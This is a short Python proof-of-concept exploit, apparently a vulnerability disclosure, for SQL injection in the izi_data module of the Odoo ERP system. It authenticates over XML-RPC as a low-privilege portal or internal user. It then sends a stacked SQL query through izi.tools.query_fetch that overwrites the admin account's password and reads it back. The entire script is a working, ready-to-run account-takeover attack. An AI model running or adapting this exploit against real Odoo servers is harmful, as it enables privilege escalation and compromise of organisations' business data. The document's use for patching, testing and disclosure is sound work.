# Exploit
# Copyright (c) 2024 Lucas Visintin
# Odoo Module: izi_data
# SQL injection vulnerabilities in:
#  - izi_data/models/common/izi_tools.py:IZITools::query_check(query)
#  - izi_data/models/common/izi_tools.py:IZITools::query_fetch(query)
#  - izi_data/models/common/izi_tools.py:IZITools::query_execute(query)

import xmlrpc.client

url = 'http://localhost:8069/'
db = 'odoodb'

# User can be Portal or Internal User with no specific permission
username = 'lucas'
password = 'lucas'



common = xmlrpc.client.ServerProxy('{}/xmlrpc/2/common'.format(url))
print(common.version())
uid = common.authenticate(db, username, password, {})


models = xmlrpc.client.ServerProxy('{}/xmlrpc/2/object'.format(url), allow_none=True)
models.execute_kw(db, uid, password, 'izi.tools', 'query_fetch', ["UPDATE res_users SET password='a' WHERE login='admin'; SELECT password FROM res_users WHERE login='admin';"])


